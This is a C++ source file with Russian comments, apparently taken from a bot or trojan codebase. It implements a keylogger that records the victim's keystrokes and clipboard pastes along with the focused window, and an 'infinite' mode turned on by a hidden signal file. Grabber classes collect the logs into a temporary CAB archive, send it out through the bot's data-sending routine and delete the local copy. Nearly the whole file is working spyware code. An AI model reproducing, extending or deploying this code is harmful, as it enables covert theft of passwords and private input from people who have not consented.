//---------------------------------------------------------------------------

#pragma hdrstop

#include "KeyLogger.h"
#include "BotCore.h"
#include "StrConsts.h"
#include "CabPacker.h"
#include "Loader.h"
#include "UniversalKeyLogger.h"
//---------------------------------------------------------------------------



//--------------------------------------------
//  GetKeyLogger Функция возвращает указатель
//  на глобальный кейлогер
//--------------------------------------------
TKeyLogger* GetKeyLogger()
{
	PKeyLogger OldLogger = KeyLogger::GetKeyLogger();
	if (!OldLogger) return NULL;

	return OldLogger->NewKeylogger;
}


//****************************************************************************
//                           TKeyLogger
//****************************************************************************


TKeyLogger::TKeyLogger()
	: TEventContainer()
{
	FGrabber = NULL;
}
//----------------------------------------------------------------------------

TKeyLogger::~TKeyLogger()
{

}
//----------------------------------------------------------------------------

//-----------------------------------------
// Функция возвращает истину если к
// кейлогеру подключен грабер
//-----------------------------------------
bool TKeyLogger::Active()
{
	return FGrabber != NULL;
}


//-----------------------------------------
// Функция записывает лог от клавиатуры
//-----------------------------------------
bool TKeyLogger::LogKeyboard(HWND Wnd, const char* Text)
{
	//------  блокируем код --------
	TLock L = GetLock();
	//------------------------------

	if (FGrabber)
		FGrabber->LogKeyboad(Wnd, Text);
	return true;
}


//-----------------------------------------
// Функция логирует вставку из буфера обмена
//-----------------------------------------
void TKeyLogger::LogClipboard(const char* Text)
{
	//------  блокируем код --------
	TLock L = GetLock();
	//------------------------------
	if (STRA::IsEmpty(Text) || !Active()) return;

	HWND Wnd = (HWND)pGetFocus();
    FGrabber->LogClipboard(Wnd, Text);
}

//-----------------------------------------
// функция логирует события мыши
//-----------------------------------------
bool TKeyLogger::LogMouse(HWND Wnd, int X, int Y, int Button)
{
	//------  блокируем код --------
	TLock L = GetLock();
	//------------------------------
	return true;
}

//-----------------------------------------
// ConnectGrabber - функци подклюает грабер
// к каналам вывода келогера
//-----------------------------------------
bool TKeyLogger::ConnectGrabber(TGrabber* Grabber)
{
	//------  блокируем код --------
	TLock L = GetLock();
	//------------------------------

	if (!Grabber || FGrabber == Grabber) return false;

	// Отклюаем подклюенный грабер
	if (FGrabber)
	{
		if (!DisconnectGrabber(FGrabber))
			return false;
    }

	// Подключаем
	FGrabber = Grabber;
	Grabber->FKeyLogger = this;
	return true;
}

//-----------------------------------------
// DisconnectGrabber функция отключает
// грабер от каналов вывода кейлогера
//-----------------------------------------
bool TKeyLogger::DisconnectGrabber(TGrabber* Grabber)
{
	//------  блокируем код --------
	TLock L = GetLock();
	//------------------------------

	if (!FGrabber || FGrabber != Grabber)
		return false;
	FGrabber->FKeyLogger = NULL;
	FGrabber = NULL;
	return true;
}


//-----------------------------------------
//  CallEvent - Функция вызывает событие
//-----------------------------------------
void TKeyLogger::CallEvent(int EventId, LPVOID Param)
{
	//------  блокируем код --------
	TLock L = GetLock();
	//------------------------------

	if (FGrabber) FGrabber->DoEvent(EventId, Param);

	inherited::CallEvent(EventId, Param);
}



//****************************************************************************
//                           TInfiniteKeyLogger
//****************************************************************************

TInfiniteKeyLogger::TInfiniteKeyLogger()
{

}
//----------------------------------------------------------------------------

TInfiniteKeyLogger::~TInfiniteKeyLogger()
{

}
//----------------------------------------------------------------------------

//--------------------------------------------
//  Функция возвращает имя сигнального файла
//  в котором будет храниться информация о
//  текущих настройках
//--------------------------------------------
string TInfiniteKeyLogger::GetSignalFileName()
{
	return BOT::MakeFileName(NULL, GetStr(EStrInfiniteKeyLoggerSignal).t_str());
}


//--------------------------------------------
//  Activate - Функция активирует глобальный
//             кейлогер
//--------------------------------------------
bool TInfiniteKeyLogger::Activate()
{
	string FN = GetSignalFileName();
	DWORD W = File::WriteBufferA(FN.t_str(), FN.t_str(), 2);
	return W == 2;
}
//----------------------------------------------------------------------------

//--------------------------------------------
//  Activated - Функция возвращает истину если
//             кейлогер активирован
//--------------------------------------------
bool TInfiniteKeyLogger::Activated()
{
	string FN = GetSignalFileName();
	return File::IsExists(FN.t_str());
}
//----------------------------------------------------------------------------




//********************************************************
//  TGrabber - Базовый класс грабера
//********************************************************
TGrabber::TGrabber(const string& GrabberName)
{
	FKeyLogger = NULL;
	FCab = NULL;
	FName = GrabberName;
}

TGrabber::~TGrabber()
{
	DisconnectFromKeyLogger();
}

//-----------------------------------------
//  ConnectToKeyLogger - функция подключает
//  грабер к кейлогеру, после чего весь
//  ввод будет транслироваться граберу
//-----------------------------------------
bool TGrabber::ConnectToKeyLogger()
{
	if (FKeyLogger) return false;

	TKeyLogger *Logger = GetKeyLogger();
	if (Logger)
		return Logger->ConnectGrabber(this);
	else
		return false;
}


//-----------------------------------------
//  DisconnectFromKeyLogger - функция
//  отключает грабер от кейлогера
//-----------------------------------------
bool TGrabber::DisconnectFromKeyLogger()
{
	bool Result = false;
	if (FKeyLogger)
	{
		Result = FKeyLogger->DisconnectGrabber(this);
		FKeyLogger = NULL;
    }
	return Result;
}


//-----------------------------------------
// Функция сохраняет текст вставленный из
// буфера обмена
//-----------------------------------------
void TGrabber::LogClipboard(HWND Wnd, const char* Text)
{
	LogKeyboad(Wnd, Text);
}


//-----------------------------------------
//  OpenCab - Функци открывает каб архив
//            во временном файле
//-----------------------------------------
LPVOID TGrabber::OpenCab()
{
	if (FCab) return FCab;
	FCabFileName = File::GetTempName2A();
	FCab = CreateCab(FCabFileName.t_str());
	if (!FCab)
    	FCabFileName.Clear();
	return FCab;
}

//-----------------------------------------
//  Ддля разрешения конфликта имёт
//-----------------------------------------
void inline _CloseCab(LPVOID Cab) { CloseCab(Cab); }

//-----------------------------------------
//  CloseCab - Функция закрывает открытый
//             каб архив и, при необходи-
//             мости, отправлет его
//-----------------------------------------
void TGrabber::CloseCab(bool SendLog)
{
	if (!FCab) return;
	// Закрваем архив
	_CloseCab(FCab);

	// Отправляем лог
	if (SendLog)
	{
		DataGrabber::SendCabDelayed(NULL, FCabFileName.t_str(), FName.t_str());
	}

	// Удаляем временный файл
	pDeleteFileA(FCabFileName.t_str());
	FCabFileName.Clear();
	FCab = NULL;
}
